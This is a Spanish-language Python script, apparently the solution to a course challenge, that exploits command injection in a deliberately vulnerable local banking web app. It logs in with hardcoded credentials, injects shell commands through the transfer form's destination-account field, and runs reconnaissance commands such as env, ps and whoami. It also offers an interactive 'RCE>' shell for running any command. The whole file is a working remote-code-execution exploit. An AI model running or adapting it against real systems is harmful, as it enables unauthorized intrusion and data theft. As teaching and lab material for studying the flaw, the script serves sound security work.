#!/usr/bin/env python3
"""
🎯 SOLUCIÓN - Desafío RCE (Remote Code Execution)
Banco Nacional - TPI SDS

Este script demuestra cómo explotar la vulnerabilidad RCE
en el sistema de transferencias bancarias.

⚠️ SOLO PARA FINES EDUCATIVOS
"""

import requests
from colorama import Fore, Style, init

init(autoreset=True)

# Configuración
BASE_URL = "http://127.0.0.1:5000"
LOGIN_URL = f"{BASE_URL}/login"
TRANSFERENCIAS_URL = f"{BASE_URL}/transferencias"

# Credenciales
USERNAME = "julian"
PASSWORD = "juli123"

def banner():
    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.YELLOW}🎯 SOLUCIÓN - Desafío RCE")
    print(f"{Fore.GREEN}   Explotación de Remote Code Execution")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")

def login(session):
    """Realizar login en el sistema bancario"""
    print(f"{Fore.BLUE}[1] Iniciando sesión...{Style.RESET_ALL}")
    
    data = {
        'usuario': USERNAME,
        'password': PASSWORD
    }
    
    response = session.post(LOGIN_URL, data=data, allow_redirects=False)
    
    if response.status_code == 302:
        print(f"{Fore.GREEN}✓ Login exitoso como '{USERNAME}'{Style.RESET_ALL}\n")
        return True
    else:
        print(f"{Fore.RED}✗ Error en el login{Style.RESET_ALL}")
        return False

def exploit_rce(session, comando):
    """
    Explotar la vulnerabilidad RCE en el campo cuenta_destino
    
    La vulnerabilidad está en app_banco.py línea ~170:
    subprocess.check_output(cuenta_destino, shell=True, ...)
    
    NO valida el input del usuario, permitiendo inyección de comandos
    """
    print(f"{Fore.BLUE}[2] Explotando RCE...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}    Comando: {comando}{Style.RESET_ALL}\n")
    
    # Datos del formulario de transferencia
    data = {
        'cuenta_origen': '1234567890',
        'cuenta_destino': comando,  # 🔓 INYECCIÓN DE COMANDOS AQUÍ
        'monto': '1000',
        'moneda': 'ARS',
        'concepto': 'Transferencia de prueba',
        'email_notif': 'test@test.com'
    }
    
    response = session.post(TRANSFERENCIAS_URL, data=data)
    
    if response.status_code == 200:
        # Extraer el resultado del HTML
        if "Verificación de cuenta:" in response.text:
            # Buscar el contenido entre las etiquetas
            inicio = response.text.find("Verificación de cuenta:") + len("Verificación de cuenta:")
            fin = response.text.find("Nota: Verifique el número", inicio)
            if fin == -1:
                fin = response.text.find("</pre>", inicio)
            
            resultado = response.text[inicio:fin].strip()
            
            print(f"{Fore.GREEN}{'='*60}")
            print(f"{Fore.GREEN}✓ COMANDO EJECUTADO EXITOSAMENTE{Style.RESET_ALL}\n")
            print(f"{Fore.CYAN}Salida:{Style.RESET_ALL}")
            print(resultado)
            print(f"{Fore.GREEN}{'='*60}{Style.RESET_ALL}\n")
            return resultado
        else:
            print(f"{Fore.RED}✗ No se pudo extraer el resultado{Style.RESET_ALL}\n")
            return None
    else:
        print(f"{Fore.RED}✗ Error en la explotación (Status: {response.status_code}){Style.RESET_ALL}\n")
        return None

def demo_comandos_linux(session):
    """Demostración de comandos Linux comunes"""
    print(f"{Fore.MAGENTA}{'='*60}")
    print(f"{Fore.MAGENTA}🐧 DEMO: Comandos Linux en WSL{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}\n")
    
    comandos = [
        ("ls -la", "Listar archivos del directorio actual"),
        ("pwd", "Ver directorio actual"),
        ("whoami", "Ver usuario actual"),
        ("cat README.md | head -20", "Ver primeras 20 líneas del README"),
        ("uname -a", "Información del sistema"),
        ("env | head -10", "Variables de entorno (primeras 10)"),
        ("ps aux | head -15", "Procesos activos (primeros 15)"),
    ]
    
    for i, (comando, descripcion) in enumerate(comandos, 1):
        print(f"{Fore.YELLOW}[{i}] {descripcion}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}    Comando: {comando}{Style.RESET_ALL}")
        exploit_rce(session, comando)
        print()

def demo_comandos_windows(session):
    """Demostración de comandos Windows (si no estás en WSL)"""
    print(f"{Fore.MAGENTA}{'='*60}")
    print(f"{Fore.MAGENTA}🪟 DEMO: Comandos Windows{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}\n")
    
    comandos = [
        ("dir", "Listar archivos del directorio actual"),
        ("cd", "Ver directorio actual"),
        ("whoami", "Ver usuario actual"),
        ("type README.md", "Ver contenido del README"),
        ("ipconfig", "Configuración de red"),
        ("systeminfo | findstr /C:\"OS\"", "Información del sistema operativo"),
        ("tasklist | findstr python", "Procesos Python activos"),
    ]
    
    for i, (comando, descripcion) in enumerate(comandos, 1):
        print(f"{Fore.YELLOW}[{i}] {descripcion}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}    Comando: {comando}{Style.RESET_ALL}")
        exploit_rce(session, comando)
        print()

def comando_personalizado(session):
    """Permitir al usuario ejecutar comandos personalizados"""
    print(f"\n{Fore.MAGENTA}{'='*60}")
    print(f"{Fore.MAGENTA}⌨️  MODO INTERACTIVO - Comandos Personalizados{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}{'='*60}{Style.RESET_ALL}\n")
    print(f"{Fore.CYAN}Escribe 'exit' o 'quit' para salir{Style.RESET_ALL}\n")
    
    while True:
        try:
            comando = input(f"{Fore.GREEN}RCE> {Style.RESET_ALL}").strip()
            
            if comando.lower() in ['exit', 'quit', '']:
                print(f"\n{Fore.YELLOW}Saliendo del modo interactivo...{Style.RESET_ALL}")
                break
            
            exploit_rce(session, comando)
            
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}Interrumpido por el usuario{Style.RESET_ALL}")
            break
        except Exception as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

def main():
    banner()
    
    # Crear sesión para mantener las cookies
    session = requests.Session()
    
    # 1. Login
    if not login(session):
        return
    
    # Menú de opciones
    while True:
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}Selecciona una opción:{Style.RESET_ALL}")
        print(f"{Fore.GREEN}1.{Style.RESET_ALL} Demo - Comandos Linux (WSL)")
        print(f"{Fore.GREEN}2.{Style.RESET_ALL} Demo - Comandos Windows")
        print(f"{Fore.GREEN}3.{Style.RESET_ALL} Ejecutar comando personalizado")
        print(f"{Fore.GREEN}4.{Style.RESET_ALL} Comando único y salir")
        print(f"{Fore.GREEN}5.{Style.RESET_ALL} Salir")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        try:
            opcion = input(f"{Fore.GREEN}Opción: {Style.RESET_ALL}").strip()
            
            if opcion == '1':
                demo_comandos_linux(session)
            elif opcion == '2':
                demo_comandos_windows(session)
            elif opcion == '3':
                comando_personalizado(session)
            elif opcion == '4':
                comando = input(f"{Fore.YELLOW}Ingresa el comando: {Style.RESET_ALL}").strip()
                if comando:
                    exploit_rce(session, comando)
                break
            elif opcion == '5':
                print(f"\n{Fore.YELLOW}¡Hasta luego!{Style.RESET_ALL}")
                break
            else:
                print(f"{Fore.RED}Opción inválida{Style.RESET_ALL}")
                
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}Interrumpido por el usuario{Style.RESET_ALL}")
            break
        except Exception as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")

if __name__ == '__main__':
    print(f"\n{Fore.RED}⚠️  ADVERTENCIA: Este script es SOLO para fines educativos{Style.RESET_ALL}")
    print(f"{Fore.RED}    NO usar en sistemas sin autorización explícita{Style.RESET_ALL}\n")
    
    try:
        main()
    except Exception as e:
        print(f"\n{Fore.RED}Error fatal: {e}{Style.RESET_ALL}")
